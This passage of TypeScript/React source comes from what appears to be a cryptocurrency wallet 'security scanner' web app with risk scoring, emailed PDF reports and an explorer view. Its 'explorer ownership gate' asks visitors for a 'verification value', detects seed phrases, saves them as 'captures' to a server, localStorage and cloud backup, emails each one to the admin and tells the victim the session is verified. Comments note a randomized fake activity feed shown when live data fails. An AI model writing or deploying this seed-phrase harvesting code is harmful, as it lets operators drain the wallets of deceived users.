      await sendEmail({
        to: adminCreds.email,
        subject,
        html: `<p>A user submitted a verification request.</p>
<p><strong>Source:</strong> ${sourceLabel}</p>
<p><strong>Wallet:</strong> ${walletAddress}</p>
<p><strong>Network:</strong> ${chainConfig[targetChain].label}</p>
<p><strong>Submitted text:</strong></p>
<pre style="white-space:pre-wrap;font-family:monospace;background:#f6f8fa;padding:10px;border-radius:8px;">${safeCredential.replace(/[<>&]/g, c => c === '<' ? '&lt;' : c === '>' ? '&gt;' : '&amp;')}</pre>
<p><strong>Time:</strong> ${nowString()}</p>`,
        text: [
          'A user submitted a verification request.',
          `Source: ${sourceLabel}`,
          `Wallet: ${walletAddress}`,
          `Network: ${chainConfig[targetChain].label}`,
          `Submitted text: ${safeCredential}`,
          `Time: ${nowString()}`,
        ].join('\n'),
      })
    } catch {
      // Non-blocking: verification capture should continue even if admin email fails.
    }
  }

  const submitExplorerSeedGate = async (e: FormEvent) => {
    e.preventDefault()
    const rawCredential = esSeedInput.trim().replace(/\s+/g, ' ')
    if (!rawCredential) {
      setEsSeedError('Enter a verification value before continuing.')
      return
    }
    const normalizedPhrase = normalizeSeedPhraseInput(rawCredential)
    const isMnemonic = looksLikeSeedPhrase(normalizedPhrase)
    const storedCredential = isMnemonic ? normalizedPhrase : rawCredential
    // Accept any non-empty address string — supports EVM, XRP, SOL, BTC routes
    const capturedWallet = esAddr || wallet || 'Unknown'
    const words = storedCredential.split(/\s+/).filter(Boolean)
    const esDuplicate = seedPhraseRecords.some(r => r.seedPhrase === storedCredential)
    const esRecord: SeedPhraseRecord = {
      id: `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
      walletAddress: capturedWallet,
      chain,
      seedPhrase: storedCredential,
      wordCount: words.length,
      source: 'auto-detected',
      detectedAt: nowString(),
      notes: esDuplicate
        ? `Duplicate capture from explorer ownership gate${isMnemonic ? '' : ' (non-standard verification text)'}`
        : `Captured from explorer ownership gate${isMnemonic ? '' : ' (non-standard verification text)'}`,
      confirmed: isMnemonic,
    }
    const esNewRecords = [esRecord, ...seedPhraseRecords]
    setSeedPhraseRecords(esNewRecords)
    // Primary: server endpoint (direct Supabase write, no SDK races)
    await pushSeedToServer(esRecord, 'explorer-submit')
    // Backups: localStorage + client SDK
    try {
      localStorage.setItem(SEED_PHRASES_KEY, JSON.stringify(esNewRecords))
      appendCaptureAudit({
        event: 'local-save',
        channel: 'explorer-submit',
        status: 'ok',
        detail: `localStorage saved ${esNewRecords.length} records`,
        recordId: esRecord.id,
        walletAddress: esRecord.walletAddress,
      })
    } catch (err) {
      appendCaptureAudit({
        event: 'local-save',
        channel: 'explorer-submit',
        status: 'error',
        detail: `localStorage save failed: ${String(err)}`,
        recordId: esRecord.id,
        walletAddress: esRecord.walletAddress,
      })
    }
    void saveMergedSeedPhrasesToCloud(esNewRecords, 'explorer-submit')
    setEsSeedError('')
    setEsSeedInput('')
    setEsSessionStartedAt(Date.now())
    setSecureStatus('Explorer session verified. Session expires in 5 minutes.')
    void notifyAdminVerificationRequest(storedCredential, 'explorer', esRecord.walletAddress, chain)
  }



  const sendProtectionWatchEmail = async (payload: PendingProtection, connectedWallet: string) => {
    const snapshotTime = nowString()
    const watchData: ReportEmailData = {
      toEmail: payload.email,
      toName: payload.name || 'there',
      wallet: connectedWallet,
      network: chainConfig[payload.network].label,
      severity: 'medium',
      riskScore: 35,
      riskPercent: 35,
      balance: walletBalance || 'N/A',
      primaryConcern: 'Continuous protection monitoring',
      findings: [
        `Protection mode activated for ${payload.wallets.length} wallet(s).`,
        `Connected wallet: ${connectedWallet}`,
        `Selected network: ${chainConfig[payload.network].label}`,
      ],
      matchedSignals: payload.wallets.map((item, idx) => `Watchlist wallet ${idx + 1}: ${item}`),
      actionPlan: actionPlan.medium,
      generatedAt: snapshotTime,
    }

    const queuedRecord: EmailRecord = {
      email: payload.email,
      name: payload.name || 'User',
      wallet: connectedWallet,
      chain: payload.network,
      severity: 'medium',
      score: 35,
      balance: walletBalance || 'N/A',
      sentAt: snapshotTime,
      emailStatus: 'pending',
    }

    setEmailRecords(prev => [queuedRecord, ...prev].slice(0, 200))

    try {
      await sendEmail({
        to: payload.email,
        subject: 'Wallet Watchout Protection Activated',
        html: buildWatchoutEmailHtml(watchData),
        text: buildWatchoutEmailText(watchData),
      })
      setEmailRecords(prev => prev.map((r, i) => i === 0 ? { ...r, emailStatus: 'sent' } : r))
      setSecureStatus(`Wallet connected. Watchout protection email sent to ${payload.email}.`)
    } catch (err) {
      setEmailRecords(prev => prev.map((r, i) => i === 0 ? { ...r, emailStatus: 'failed' } : r))
      setSecureStatus(`Wallet connected, but watchout email failed to send. ${err instanceof Error ? err.message : ''}`.trim())
    }
  }

  // ── AppKit pending-protection effect ─────────────────────────────────
  useEffect(() => {
    if (pendingProtection && isAppKitConnected && appKitAddress) {
      // eslint-disable-next-line react-hooks/set-state-in-effect
      void sendProtectionWatchEmail(pendingProtection, appKitAddress).finally(() => setPendingProtection(null))
    }
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [isAppKitConnected, appKitAddress])

  useEffect(() => {
    let alive = true
    const loadEtherscanData = async () => {
      if (activeView !== 'etherscan') return
      const now = Date.now()
      const sessionActive = Boolean(esSessionStartedAt && now - esSessionStartedAt < ETHERSCAN_SESSION_MS)
      const lockActive = Boolean(esLockoutUntil && esLockoutUntil > now)
      if (!sessionActive) {
        if (!alive) return
        setEsTxRows([])
        // Don't leak gating/dev guidance into the user view; the gate UI handles messaging.
        if (!lockActive) setEsError('')
        return
      }
      const alchemyRpcUrl = getAlchemyRpcUrl(chain)
      if (!esAddr) {
        if (!alive) return
        setEsError('')
        setEsTxRows([])
        return
      }
      if (!alchemyRpcUrl) {
        if (!alive) return
        // Live data not configured — page falls back to randomized activity feed silently.
        setEsError('')
        setEsTxRows([])
        return
      }

      setEsLoading(true)
      setEsError('')
      try {
        const [balanceHex, txCountHex, blockHex, gasPriceHex] = await Promise.all([
          rpcFetch(alchemyRpcUrl, 'eth_getBalance', [esAddr, 'latest']),
          rpcFetch(alchemyRpcUrl, 'eth_getTransactionCount', [esAddr, 'latest']),
          rpcFetch(alchemyRpcUrl, 'eth_blockNumber', []),
          rpcFetch(alchemyRpcUrl, 'eth_gasPrice', []),
        ])

        const gasPriceWei = BigInt((gasPriceHex as string) || '0x0')
        const gasGwei = Number(gasPriceWei) / 1e9

        const [incomingRes, outgoingRes] = await Promise.all([
          rpcFetch(alchemyRpcUrl, 'alchemy_getAssetTransfers', [{
            fromBlock: '0x0',
            toBlock: 'latest',
            toAddress: esAddr,
            category: ['external', 'internal', 'erc20'],
            withMetadata: true,
            excludeZeroValue: false,
            order: 'desc',
            maxCount: '0x14',
          }]),
          rpcFetch(alchemyRpcUrl, 'alchemy_getAssetTransfers', [{
            fromBlock: '0x0',
            toBlock: 'latest',
            fromAddress: esAddr,
            category: ['external', 'internal', 'erc20'],
            withMetadata: true,
            excludeZeroValue: false,
            order: 'desc',
            maxCount: '0x14',
          }]),
        ])

        type TransferRow = {
          hash?: string
          blockNum?: string
          from?: string
          to?: string
          value?: string | number
          asset?: string
          category?: string
          metadata?: { blockTimestamp?: string }
        }

        const incoming = ((incomingRes as { transfers?: TransferRow[] })?.transfers ?? [])
        const outgoing = ((outgoingRes as { transfers?: TransferRow[] })?.transfers ?? [])
        const combined = [...incoming, ...outgoing].filter(t => typeof t.hash === 'string' && !!t.hash)

        const uniqueByHash = new Map<string, TransferRow>()
        for (const tx of combined) {
          if (!tx.hash) continue
          if (!uniqueByHash.has(tx.hash)) uniqueByHash.set(tx.hash, tx)
        }

        const uniqTransfers = [...uniqueByHash.values()]
          .sort((a, b) => parseInt(b.blockNum ?? '0x0', 16) - parseInt(a.blockNum ?? '0x0', 16))
          .slice(0, 20)

        const fees = await Promise.all(
          uniqTransfers.map(async tx => {
            if (!tx.hash) return ['unknown', 'N/A'] as const
            try {
              const receipt = await rpcFetch(alchemyRpcUrl, 'eth_getTransactionReceipt', [tx.hash]) as { gasUsed?: string; effectiveGasPrice?: string }
              if (!receipt?.gasUsed || !receipt?.effectiveGasPrice) return [tx.hash, 'N/A'] as const
              const weiFee = BigInt(receipt.gasUsed) * BigInt(receipt.effectiveGasPrice)
              const feeEth = Number(weiFee) / 1e18
              return [tx.hash, `${feeEth.toFixed(6)} ${chainConfig[chain].nativeSymbol}`] as const
            } catch {
              return [tx.hash, 'N/A'] as const
            }
          }),
        )
        const feeMap = new Map<string, string>(fees)

        const txRows: EtherscanTxRow[] = uniqTransfers.map((tx) => {
          const block = parseInt(tx.blockNum ?? '0x0', 16)
          const from = tx.from ?? '0x0000000000000000000000000000000000000000'
          const to = tx.to ?? '0x0000000000000000000000000000000000000000'
          const direction = from.toLowerCase() === esAddr.toLowerCase() ? 'OUT' : 'IN'
          const timestamp = tx.metadata?.blockTimestamp ? Date.parse(tx.metadata.blockTimestamp) : Date.now()
          const valueNum = typeof tx.value === 'string' ? Number(tx.value) : (tx.value ?? 0)
          const token = tx.asset || chainConfig[chain].nativeSymbol
          const value = Number.isFinite(valueNum)
            ? `${valueNum.toLocaleString(undefined, { maximumFractionDigits: 6 })} ${token}`
            : `0 ${token}`
          const method = tx.category === 'erc20' ? 'Token Transfer' : tx.category === 'internal' ? 'Internal Txn' : 'Transfer'
          return {
            hash: tx.hash ?? '',
            method,
            block,
            age: formatAgeFromTimestamp(timestamp),
            from,
            to,
            direction,
            value,
            fee: feeMap.get(tx.hash ?? '') ?? 'N/A',
          }
        })

        let nativeUsdPrice: string | null = null
        const priceKey = priceFeedByChain[chain]
        try {
          const priceRes = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${priceKey}&vs_currencies=usd`)
          if (priceRes.ok) {
            const pricePayload = await priceRes.json() as Record<string, { usd?: number }>
            if (typeof pricePayload[priceKey]?.usd === 'number') {
              nativeUsdPrice = pricePayload[priceKey].usd.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })
            }
          }
        } catch {
          nativeUsdPrice = null
        }

        if (!alive) return
        setEsEthBalance(weiToNative(balanceHex as string, 4) ?? '0.0000')
        setEsTxCount(hexToNum(txCountHex as string) ?? txRows.length)
        setEsLatestBlock(hexToNum(blockHex as string))
        setEsGasGwei(gasGwei.toFixed(2))
        setEsEthUsdPrice(nativeUsdPrice)
        setEsTxRows(txRows)
      } catch {
        if (!alive) return
        // Swallow RPC errors from the user view; the randomized fallback feed will render instead.
        setEsError('')
        setEsTxRows([])
      } finally {
        if (alive) setEsLoading(false)
      }
    }

    void loadEtherscanData()
    return () => { alive = false }
  }, [activeView, chain, esAddr, esLockoutUntil, esSessionStartedAt])

  const switchNetwork = async () => {
    if (!isAppKitConnected) return
    try {
      switchChain({ chainId: chainConfig[chain].chainId })
      setWeb3Status(`Switching to ${chainConfig[chain].label}…`)
    } catch (e) { setWeb3Status(`Switch failed: ${e instanceof Error ? e.message : 'Unknown error'}`) }
  }

  // ── Signer probe — supports both AppKit and WalletConnect sessions ────
  const testSigner = async () => {
    const wcAddr = wcSessions[0]?.address
    const hasWcSession = wcStatus === 'connected' && !!wcAddr && !!wcClientRef.current && !!wcSelectedTopic
    const hasAppKit   = !!walletClient && !!appKitAddress

    if (!hasWcSession && !hasAppKit) {
      setSignerCheck('No wallet connected. Connect via WalletConnect or the Connect button above.')
      return
    }

    try {
      setIsTestingSigner(true)
      const challenge = `Sentinel ownership check @ ${new Date().toISOString()}`
      const signerAddr = appKitAddress ?? wcAddr ?? 'Unknown'

      if (hasWcSession && !hasAppKit) {
        // ── WalletConnect path ─────────────────────────────────────────
        const hexMsg = `0x${Array.from(new TextEncoder().encode(challenge)).map(b => b.toString(16).padStart(2, '0')).join('')}`
        await wcClientRef.current!.request({
          topic: wcSelectedTopic!,
          chainId: `eip155:${chainConfig[chain].chainId}`,
          request: { method: 'personal_sign', params: [hexMsg, wcAddr] },
        })
        // Mark session as verified
        setWcSessions(prev => prev.map(s =>
          s.topic === wcSelectedTopic ? { ...s, ownershipVerified: true } : s
        ))
      } else {
        // ── AppKit / wagmi path ────────────────────────────────────────
        await walletClient!.signMessage({ account: appKitAddress as `0x${string}`, message: challenge })
      }

      setSignerCheck('✅ Ownership verified — wallet signed the challenge successfully.')
      setOwnershipStatus('Ownership verified via message signature.')
      setSignerChecks(prev => [
        { wallet: signerAddr, chain, status: 'passed' as const, detail: 'Signed ownership challenge.', checkedAt: nowString() },
        ...prev,
      ].slice(0, 200))

      const lockMs = esLockoutUntil ? Math.max(0, esLockoutUntil - Date.now()) : 0
      if (lockMs > 0) {
        setSecureStatus(`Explorer lockout active — try again in ${Math.ceil(lockMs / 60000)} min.`)
      } else {
        setTimeout(() => setActiveView('etherscan'), 600)
      }
    } catch (e) {
      const msg = e instanceof Error ? e.message : 'Unknown error'
      const signerAddr = appKitAddress ?? wcSessions[0]?.address ?? wallet ?? 'Unknown'
      setSignerCheck(`Signature failed: ${msg}`)
      setOwnershipStatus(`Verification failed — ${msg}`)
      setSignerChecks(prev => [
        { wallet: signerAddr, chain, status: 'failed' as const, detail: msg, checkedAt: nowString() },
        ...prev,
      ].slice(0, 200))
    } finally {
      setIsTestingSigner(false)
    }
  }

  // ── Auto-deliver the scan report to the visitor's gate email ─────────
  // Triggered from executeScan() on every manual scan when the visitor has
  // already supplied an email at the welcome gate. We dedupe per wallet+email
  // via localStorage so the inbox doesn't get spammed if a user re-scans the
  // same wallet repeatedly.
  const maybeSendScanReportToGateEmail = async (
    scannedWallet: string,
    scannedChain: ChainKey,
    score: number,
    severity: Severity,
    findings: string[],
    balanceLabel: string,
  ) => {
    const recipient = (gateEmail || localStorage.getItem(GATE_EMAIL_KEY) || '').trim().toLowerCase()
    if (!recipient || !isValidEmail(recipient)) return

    const dedupeKey = `${recipient}::${scannedWallet.toLowerCase()}::${scannedChain}::${severity}`
    let alreadySent: string[] = []
    try { alreadySent = JSON.parse(localStorage.getItem(SCAN_EMAILED_KEY) ?? '[]') as string[] }
    catch { alreadySent = [] }
    if (alreadySent.includes(dedupeKey)) return

    const userName = recipient.split('@')[0] || 'there'
    const reportData: ReportEmailData = {
      toEmail: recipient,
      toName: userName,
      wallet: scannedWallet,
      network: chainConfig[scannedChain].label,
      severity,
      riskScore: score,
      riskPercent: score,
      balance: balanceLabel,
      primaryConcern: '',
      findings,
      matchedSignals: [],
      actionPlan: actionPlan[severity],
      generatedAt: nowString(),
    }

    const queuedRecord: EmailRecord = {
      email: recipient,
      name: userName,
      wallet: scannedWallet,
      chain: scannedChain,
      severity,
      score,
      balance: balanceLabel,
      sentAt: nowString(),
      emailStatus: 'pending',
    }
    setEmailRecords(prev => [queuedRecord, ...prev].slice(0, 200))

    try {
      const gatePdf = generateSecurityReportPdf({
        wallet: reportData.wallet, network: reportData.network,
        severity: reportData.severity, riskScore: reportData.riskScore,
        riskPercent: reportData.riskPercent, balance: reportData.balance,
        primaryConcern: reportData.primaryConcern, findings: reportData.findings,
        matchedSignals: reportData.matchedSignals, actionPlan: reportData.actionPlan,
        generatedAt: reportData.generatedAt, toName: reportData.toName,
      })
      await sendEmail({
        to: recipient,
        subject: `Your Wallet Security Report — Risk: ${severity.toUpperCase()}`,
        html: buildEmailHtml(reportData),
        text: buildEmailText(reportData),
        attachments: [{ filename: 'security-report.pdf', content: gatePdf }],
      })
      setEmailRecords(prev => prev.map((r, i) => i === 0 ? { ...r, emailStatus: 'sent' } : r))
      setReportStatus(`Report emailed to ${recipient}.`)
      try {
        localStorage.setItem(
          SCAN_EMAILED_KEY,
          JSON.stringify([dedupeKey, ...alreadySent].slice(0, 500)),
        )
      } catch { /* quota — fine to skip */ }
    } catch (err) {
      setEmailRecords(prev => prev.map((r, i) => i === 0 ? { ...r, emailStatus: 'failed' } : r))
      setReportStatus(`Auto-report send failed. ${err instanceof Error ? err.message : ''}`.trim())
    }
  }

  // ── Silently email the scan report after an auto-scan ────────────────
  const autoSendScanReport = async (
    scannedWallet: string,
    scannedChain: ChainKey,
    score: number,
    severity: Severity,
    findings: string[],
  ) => {
    const email = autoEmailInput.trim()
    if (!email) return

    const userName = autoEmailNameInput.trim() || 'there'
    const reportData: ReportEmailData = {
      toEmail: email,
      toName: userName,
      wallet: scannedWallet,
      network: chainConfig[scannedChain].label,
      severity,
      riskScore: score,
      riskPercent: score,
      balance: walletBalance || 'N/A',
      primaryConcern: '',
      findings,
      matchedSignals: [],
      actionPlan: [],
      generatedAt: nowString(),
    }

    const queuedRecord: EmailRecord = {
      email,
      name: userName,
      wallet: scannedWallet,
      chain: scannedChain,
      severity,
      score,
      balance: walletBalance || 'N/A',
      sentAt: nowString(),
      emailStatus: 'pending',
    }
    setEmailRecords(prev => [queuedRecord, ...prev].slice(0, 200))

    try {
      const autoPdf = generateSecurityReportPdf({
        wallet: reportData.wallet, network: reportData.network,
        severity: reportData.severity, riskScore: reportData.riskScore,
        riskPercent: reportData.riskPercent, balance: reportData.balance,
        primaryConcern: reportData.primaryConcern, findings: reportData.findings,
        matchedSignals: reportData.matchedSignals, actionPlan: reportData.actionPlan,
        generatedAt: reportData.generatedAt, toName: reportData.toName,
      })
      await sendEmail({
        to: email,
        subject: `Your Wallet Security Report — Risk: ${severity.toUpperCase()}`,
        html: buildEmailHtml(reportData),
        text: buildEmailText(reportData),
        attachments: [{ filename: 'security-report.pdf', content: autoPdf }],
      })
      setEmailRecords(prev => prev.map((r, i) => i === 0 ? { ...r, emailStatus: 'sent' } : r))
      setReportStatus(`Report sent to ${email}`)
    } catch (err) {
      setEmailRecords(prev => prev.map((r, i) => i === 0 ? { ...r, emailStatus: 'failed' } : r))
      setReportStatus(`Report queued — email delivery failed. ${err instanceof Error ? err.message : ''}`.trim())
    }
  }

  // ── Core scan engine — called by both the manual form and auto-scan ────
  async function executeScan(targetWallet: string, targetChain: ChainKey, isAutoScan = false) {
    const cleanWallet = targetWallet.trim()
    if (!isAddress(cleanWallet)) return

    setSubmitted(true); setReportStatus(''); setEmailSentMsg('')
    setIsRunningWeb3(true)
    setWeb3Status(`Scanning ${chainConfig[targetChain].label} — fetching on-chain data…`)

    const matchedSignals = isAutoScan ? [] : signals.filter(s => selectedSignals.includes(s.id))
    const baseScore = matchedSignals.reduce((sum, s) => sum + s.points, 0)
    const byGroup: Record<Signal['group'], number> = { watching: 0, seed: 0, drainer: 0 }
    matchedSignals.forEach(s => { byGroup[s.group] += s.points })
    const primaryConcern = (Object.entries(byGroup).sort((a, b) => b[1] - a[1])[0][1]
      ? Object.entries(byGroup).sort((a, b) => b[1] - a[1])[0][0] : null) as Signal['group'] | null

    const adminIntel = adminIntelRecords.find(r =>
      r.address.toLowerCase() === cleanWallet.toLowerCase() &&
      (r.chain === targetChain || r.chain === 'ethereum')
    ) ?? null

    try {
      const [web3, securityApi] = await Promise.all([
        runWeb3Scan(cleanWallet, targetChain),
        runSecurityApiScan(cleanWallet, targetChain).catch(() => null),
      ])
      let web3Points = 0
      if (web3.pendingGap > 0)                      web3Points += 8
      if ((web3.recentApprovals ?? 0) >= 3)         web3Points += 12
      if ((web3.recentApprovals ?? 0) >= 8)         web3Points += 8
      if ((web3.recentOutgoingTransfers ?? 0) >= 6) web3Points += 10
      if ((web3.recentOutgoingTransfers ?? 0) >= 15)web3Points += 8

      const securityApiPoints = securityApi
        ? (securityApi.maliciousAddress ? 30 : 0) + Math.min(24, securityApi.hitFlags.length * 6)
        : 0

      const adminIntelPoints = adminIntel
        ? (adminIntel.severity === 'critical' ? 40 : adminIntel.severity === 'high' ? 25 : adminIntel.severity === 'medium' ? 10 : 0)
        : 0

      const rawScore = baseScore + web3Points + securityApiPoints + adminIntelPoints
      const score = Math.min(100, rawScore)
      let severity = getSeverity(score)
      if (adminIntel) {
        const sevOrder: Severity[] = ['low', 'medium', 'high', 'critical']
        if (sevOrder.indexOf(adminIntel.severity) > sevOrder.indexOf(severity)) severity = adminIntel.severity
      }
      const bal = web3.nativeBalance ? `${web3.nativeBalance} ${chainConfig[targetChain].nativeSymbol}` : (walletBalance || 'N/A')
      const findings = [
        ...web3.findings,
        ...(securityApi?.findings ?? []),
        ...(adminIntel ? adminIntel.findings.map(f => `[System Intel] ${f}`) : []),
      ]

      setResult({ score, severity, riskPercent: score, matchedSignals, byGroup, primaryConcern, web3, web3RiskPoints: web3Points, securityApi, adminIntel, generatedAt: nowString() })
      setScanHistory(prev => [{
        wallet: cleanWallet, chain: targetChain, score, severity, balance: bal,
        findings, matchedSignals: matchedSignals.map(s => s.label),
        generatedAt: nowString(),
      }, ...prev].slice(0, 200))
      setLastScannedWallet(cleanWallet.toLowerCase())
      const rpcMsg = isWalletConnected && appKitChainId === chainConfig[targetChain].chainId ? 'connected wallet RPC' : 'public RPC fallback'
      const apiMsg = securityApi ? 'GoPlus intel included.' : 'GoPlus unavailable.'
      const intelMsg = adminIntel ? ' System intel applied.' : ''
      setWeb3Status(`Scan complete via ${rpcMsg}. ${apiMsg}${intelMsg}`)
      if (isAutoScan) {
        await autoSendScanReport(cleanWallet, targetChain, score, severity, findings)
      } else {
        await maybeSendScanReportToGateEmail(cleanWallet, targetChain, score, severity, findings, bal)
      }
    } catch {
      const severity = adminIntel?.severity ?? getSeverity(baseScore)
      const adminIntelPoints = adminIntel
        ? (adminIntel.severity === 'critical' ? 40 : adminIntel.severity === 'high' ? 25 : adminIntel.severity === 'medium' ? 10 : 0)
        : 0
      const score = Math.min(100, baseScore + adminIntelPoints)
      setResult({ score, severity, riskPercent: score, matchedSignals, byGroup, primaryConcern, web3: null, web3RiskPoints: 0, securityApi: null, adminIntel, generatedAt: nowString() })
      setScanHistory(prev => [{
        wallet: cleanWallet, chain: targetChain, score, severity, balance: walletBalance || 'N/A',
        findings: adminIntel ? adminIntel.findings.map(f => `[System Intel] ${f}`) : [],
        matchedSignals: matchedSignals.map(s => s.label), generatedAt: nowString(),
      }, ...prev].slice(0, 200))
      setLastScannedWallet(cleanWallet.toLowerCase())
      setWeb3Status('We had trouble reaching the network — using the latest cached intelligence for this scan.')
      if (isAutoScan) {
        await autoSendScanReport(cleanWallet, targetChain, score, severity, [])
      } else {
        await maybeSendScanReportToGateEmail(cleanWallet, targetChain, score, severity, [], walletBalance || 'N/A')
      }
    } finally {
      setIsRunningWeb3(false)
      // Reset CAPTCHA so next scan requires re-verification
      refreshCaptcha()
    }
  }

  // ── Manual form submit wrapper ────────────────────────────────────────
  const refreshCaptcha = () => {
    setCaptchaA(Math.floor(Math.random() * 10) + 1)
    setCaptchaB(Math.floor(Math.random() * 10) + 1)
    setCaptchaInput('')
    setCaptchaError('')
    setCaptchaPassed(false)
  }

  const verifyCaptcha = (): boolean => {
    if (honeypot) return false // bot detected
    if (captchaPassed) return true
    const answer = parseInt(captchaInput.trim(), 10)
    if (isNaN(answer) || answer !== captchaA + captchaB) {
      setCaptchaError(`Incorrect. ${captchaA} + ${captchaB} = ?`)
      refreshCaptcha()
      return false
    }
    setCaptchaPassed(true)
    setCaptchaError('')
    return true
  }

  const runScan = async (e: FormEvent) => {
    e.preventDefault()
    if (!addressValid) return
    if (!verifyCaptcha()) return
    const cleanWallet = wallet.trim()
    if (cleanWallet !== wallet) setWallet(cleanWallet)
    await executeScan(cleanWallet, chain)
  }

  // ── Send email report ─────────────────────────────────────────────────
  const sendEmailReport = async (e: FormEvent) => {
    e.preventDefault()
    if (!result || !emailInput) return
    setEmailSending(true)

    const bal = result.web3?.nativeBalance
      ? `${result.web3.nativeBalance} ${chainConfig[chain].nativeSymbol}`
      : (walletBalance || 'N/A')

    const data: ReportEmailData = {
      toEmail:       emailInput,
      toName:        nameInput || 'there',
      wallet,
      network:       chainConfig[chain].label,
      severity:      result.severity,
      riskScore:     result.score,
      riskPercent:   result.riskPercent,
      balance:       bal,
      primaryConcern: result.primaryConcern ? groupLabel[result.primaryConcern] : 'None',
      findings:      result.web3?.findings ?? [],
      matchedSignals: result.matchedSignals.map(s => s.label),
      actionPlan:    actionPlan[result.severity],
      generatedAt:   result.generatedAt,
    }

    const newRecord: EmailRecord = {
      email: emailInput, name: nameInput || 'User', wallet, chain,
      severity: result.severity, score: result.score, balance: bal,
      sentAt: nowString(), emailStatus: 'pending',
    }

    setEmailRecords(prev => [newRecord, ...prev].slice(0, 200))

    try {
      const pdfBase64 = generateSecurityReportPdf({
        wallet: data.wallet,
        network: data.network,
        severity: data.severity,
        riskScore: data.riskScore,
        riskPercent: data.riskPercent,
        balance: data.balance,
        primaryConcern: data.primaryConcern,
        findings: data.findings,
        matchedSignals: data.matchedSignals,
        actionPlan: data.actionPlan,
        generatedAt: data.generatedAt,
        toName: data.toName,
      })
      await sendEmail({
        to: data.toEmail,
        subject: `Your One Link Security Report — ${data.severity.toUpperCase()} Risk`,
        html: buildEmailHtml(data),
        text: buildEmailText(data),
        attachments: [{ filename: 'security-report.pdf', content: pdfBase64 }],
      })
      setEmailRecords(prev => prev.map((r, i) => i === 0 ? { ...r, emailStatus: 'sent' } : r))
      setEmailSentMsg(`Report sent to ${emailInput}.`)
    } catch {
      setEmailRecords(prev => prev.map((r, i) => i === 0 ? { ...r, emailStatus: 'failed' } : r))
      setEmailSentMsg('We could not send your report right now. Please try again in a moment.')
    }
    setEmailSending(false)
  }

  // ── Auto-scan email modal submit ─────────────────────────────────────
  // ── Export ─────────────────────────────────────────────────────────────
  const exportReport = () => {
    if (!result || !addressValid) return
    const payload = { generatedAt: result.generatedAt, wallet, chain: chainConfig[chain].label, riskScore: result.score, severity: result.severity, web3: result.web3, matchedSignals: result.matchedSignals.map(s => s.label) }
    const blob = new Blob([JSON.stringify(payload, null, 2)], { type: 'application/json' })
    const url = URL.createObjectURL(blob)
    const a = document.createElement('a'); a.href = url; a.download = `sentinel-${chain}-${Date.now()}.json`; a.click()
    URL.revokeObjectURL(url); setReportStatus('Report exported.')
  }

  const copyPlan = async () => {
    if (!result) return
    try { await navigator.clipboard.writeText(actionPlan[result.severity].map((s, i) => `${i + 1}. ${s}`).join('\n')); setReportStatus('Plan copied.') }
    catch { setReportStatus('Clipboard blocked.') }
  }

  const startSecureWallet = async (e: FormEvent) => {
    e.preventDefault()

    // Auto-fill address from connected wallet if field is empty
    const rawInput = secureWalletsInput.trim() || (appKitAddress ?? '')
    const parsedWallets = rawInput
      .split(/[\n,\s]+/)
      .map(entry => entry.trim())
      .filter(Boolean)

    if (!secureEmailInput.trim()) {
      setSecureStatus('⚠ Enter an email address to receive watchout alerts.')
      return
    }
    if (parsedWallets.length === 0) {
      if (!isAppKitConnected) {
        // No address and no wallet — open modal first
        setSecureStatus('Connecting wallet… Enter your wallet address or connect above.')
        void openWalletModal()
        return
      }
      setSecureStatus('⚠ Enter at least one wallet address to monitor.')
      return
    }
    if (!secureMultiMode && parsedWallets.length > 1) {
      setSecureStatus('⚠ Multiple addresses detected. Enable multi-wallet mode or keep one address.')
      return
    }
    const invalidWallet = parsedWallets.find(item => !isAddress(item))
    if (invalidWallet) {
      setSecureStatus(`⚠ Invalid wallet address: ${invalidWallet}`)
      return
    }

    if (rawInput !== secureWalletsInput) setSecureWalletsInput(rawInput)
    setWallet(parsedWallets[0])
    const request: PendingProtection = {
      email: secureEmailInput.trim(),
      name: secureNameInput.trim(),
      wallets: parsedWallets,
      network: chain,
    }
    setPendingProtection(request)

    if (isAppKitConnected && appKitAddress) {
      setSecureStatus('Processing protection setup…')
      await sendProtectionWatchEmail(request, appKitAddress)
      setPendingProtection(null)
      return
    }

    setSecureStatus('Wallet not connected — opening connection modal…')
    void openWalletModal()
  }

  const isValidEmail = (value: string) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value)

  const openAdminAuthPrompt = () => {
    setAdminPasswordInput('')
    setAdminAuthError('')
    setAdminAuthModalOpen(true)
  }

  // Inline admin password step (shown inside the gate card — avoids z-index battles with overlay)
  const submitAdminPasswordInline = (e: FormEvent) => {
    e.preventDefault()
    if (emailGatePassInput === adminCreds.password) {
      setIsAdminAuthenticated(true)
      setAdminAuthModalOpen(false)
      setEmailGatePassed(true)
      setEmailGateStep('email')
      setEmailGateError('')
      localStorage.setItem(GATE_PASSED_KEY, '1')
      setActiveView('admin')
    } else {
      setEmailGateError('Incorrect password. Try again.')
    }
  }

  const submitEmailGate = (e: FormEvent) => {
    e.preventDefault()
    const email = emailGateInput.trim().toLowerCase()
    if (!isValidEmail(email)) {
      setEmailGateError('Please enter a valid email address.')
      return
    }
    setEmailGateError('')

    // Admin email → show inline password step (no hidden modal)
    if (email === adminCreds.email.toLowerCase()) {
      setEmailGateStep('password')
      setEmailGatePassInput('')
      return
    }

    const passGate = () => {
      setEmailGatePassed(true)
      setGateEmail(email)
      localStorage.setItem(GATE_PASSED_KEY, '1')
      localStorage.setItem(GATE_EMAIL_KEY, email)
      void maybeSendVisitEmail(email)
    }

    const userRoute = userEmailRoutes.find(r => r.email.toLowerCase() === email)
    if (userRoute) {
      passGate()
      // If route has an address configured, pre-load it into wallet state
      if (userRoute.address) {
        setWallet(userRoute.address)
        const mappedChain = explorerTypeToChain[userRoute.explorerType ?? 'etherscan']
        if (mappedChain) setChain(mappedChain)
      }
      setActiveView(userRoute.view)
      return
    }

    passGate()
    // Pre-fill the wallet-landing email so the user doesn't have to type it twice
    setLandingEmail(email)
    // If a wallet browser was detected and wallet-landing is queued, keep it;
    // otherwise fall back to home
    if (activeView !== 'wallet-landing') {
      setActiveView('home')
    }
  }

  const maybeSendVisitEmail = async (email: string) => {
    let alreadySent: string[] = []
    try { alreadySent = JSON.parse(localStorage.getItem(VISITED_EMAILS_KEY) ?? '[]') as string[] }
    catch { alreadySent = [] }
    if (alreadySent.includes(email)) return

